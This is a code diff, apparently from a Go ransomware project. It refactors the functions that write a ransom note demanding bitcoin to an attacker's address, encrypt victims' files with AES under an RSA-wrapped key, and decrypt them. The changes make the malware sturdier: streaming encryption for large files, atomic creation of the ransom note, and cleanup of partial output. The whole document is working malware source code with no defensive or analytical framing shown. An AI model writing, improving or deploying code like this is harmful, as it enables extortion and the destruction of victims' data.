@@ -4,6 +4,7 @@ import (
 	"crypto/rsa"
 	"errors"
 	"fmt"
+	"io"
 	"log/slog"
 	"os"
 	"path/filepath"
@@ -210,16 +211,9 @@ func Decrypt(ctx *urfavecli.Context) error {
 	return nil
 }
 
-func writeRansomNote(dir, fileName, templatePath string, publicKey *rsa.PublicKey, bitcoinAddress string, bitcoinCount float64) error {
+func writeRansomNote(dir, fileName, templatePath string, publicKey *rsa.PublicKey, bitcoinAddress string, bitcoinCount float64) (retErr error) {
 	ransomPath := filepath.Join(dir, fileName)
 	slog.Info("Adding ransom file", "path", ransomPath)
-
-	if _, err := os.Stat(ransomPath); err == nil {
-		slog.Warn("Ransom file already exists, skipping", "path", ransomPath)
-		return nil
-	} else if !errors.Is(err, os.ErrNotExist) {
-		return err
-	}
 
 	templateAbsPath, err := filepath.Abs(templatePath)
 	if err != nil {
@@ -236,69 +230,88 @@ func writeRansomNote(dir, fileName, templatePath string, publicKey *rsa.PublicKe
 		return err
 	}
 
-	file, err := os.Create(ransomPath)
+	// O_EXCL fails atomically if the file already exists, avoiding a TOCTOU race.
+	file, err := os.OpenFile(ransomPath, os.O_WRONLY|os.O_CREATE|os.O_EXCL, 0644)
+	if errors.Is(err, os.ErrExist) {
+		slog.Warn("Ransom file already exists, skipping", "path", ransomPath)
+		return nil
+	}
 	if err != nil {
 		return err
 	}
+	defer func() {
+		if closeErr := file.Close(); retErr == nil && closeErr != nil {
+			retErr = fmt.Errorf("close ransom note: %w", closeErr)
+		}
+	}()
 
-	execErr := tmpl.Execute(file, &ransomData{
+	return tmpl.Execute(file, &ransomData{
 		BitcoinCount:   bitcoinCount,
 		BitcoinAddress: bitcoinAddress,
 		PublicKey:      textPublicKey,
 	})
-
-	if closeErr := file.Close(); execErr != nil {
-		return execErr
-	} else if closeErr != nil {
-		return closeErr
-	}
-
-	return nil
 }
 
-func encryptFile(path string, aesKey crypto.AesKey, encryptedAesKey []byte, encSuffix string) error {
-	plainText, err := os.ReadFile(path)
+func encryptFile(path string, aesKey crypto.AesKey, encryptedAesKey []byte, encSuffix string) (retErr error) {
+	src, err := os.Open(path)
 	if err != nil {
 		return err
 	}
+	defer func() { _ = src.Close() }()
 
-	cipherText, err := crypto.AesEncrypt(plainText, aesKey)
+	outPath := path + encSuffix
+	dst, err := os.OpenFile(outPath, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0644)
 	if err != nil {
 		return err
 	}
+	defer func() {
+		if closeErr := dst.Close(); retErr == nil && closeErr != nil {
+			retErr = fmt.Errorf("close encrypted file: %w", closeErr)
+		}
+		if retErr != nil {
+			_ = os.Remove(outPath)
+		}
+	}()
 
-	// Allocate a new slice to avoid mutating the shared encryptedAesKey.
-	fileContent := make([]byte, 0, len(encryptedAesKey)+len(cipherText))
-	fileContent = append(fileContent, encryptedAesKey...)
-	fileContent = append(fileContent, cipherText...)
-	return fs.WriteToFile(path+encSuffix, fileContent)
+	if _, err := dst.Write(encryptedAesKey); err != nil {
+		return fmt.Errorf("write encrypted key: %w", err)
+	}
+
+	return crypto.AesEncryptStream(src, dst, aesKey)
 }
 
-func decryptFile(path string, rsaPrivateKey *rsa.PrivateKey, encSuffix string) error {
-	cipherText, err := os.ReadFile(path)
+func decryptFile(path string, rsaPrivateKey *rsa.PrivateKey, encSuffix string) (retErr error) {
+	src, err := os.Open(path)
+	if err != nil {
+		return err
+	}
+	defer func() { _ = src.Close() }()
+
+	encryptedKey := make([]byte, rsaPrivateKey.Size())
+	if _, err := io.ReadFull(src, encryptedKey); err != nil {
+		return fmt.Errorf("read encrypted key: %w", err)
+	}
+
+	aesKey, err := crypto.RsaDecrypt(encryptedKey, rsaPrivateKey)
 	if err != nil {
 		return err
 	}
 
-	keySize := rsaPrivateKey.Size()
-	// AES-GCM ciphertext must contain at least a 12-byte nonce and a 16-byte
-	// authentication tag in addition to the RSA-encrypted key prefix.
-	const minAESGCMOverhead = 12 + 16 // nonce + tag
-	if len(cipherText) < keySize+minAESGCMOverhead {
-		return fmt.Errorf("file too small to be a valid encrypted file: %s", path)
-	}
-
-	aesKey, err := crypto.RsaDecrypt(cipherText[:keySize], rsaPrivateKey)
+	outPath := strings.TrimSuffix(path, encSuffix)
+	dst, err := os.OpenFile(outPath, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0644)
 	if err != nil {
 		return err
 	}
+	defer func() {
+		if closeErr := dst.Close(); retErr == nil && closeErr != nil {
+			retErr = fmt.Errorf("close decrypted file: %w", closeErr)
+		}
+		if retErr != nil {
+			_ = os.Remove(outPath)
+		}
+	}()
 
-	plainText, err := crypto.AesDecrypt(cipherText[keySize:], aesKey)
-	if err != nil {
-		return err
-	}
-
-	return fs.WriteToFile(strings.TrimSuffix(path, encSuffix), plainText)
+	return crypto.AesDecryptStream(src, dst, aesKey)
 }
 
 // splitCommaSeparated splits a comma-separated string into a slice.
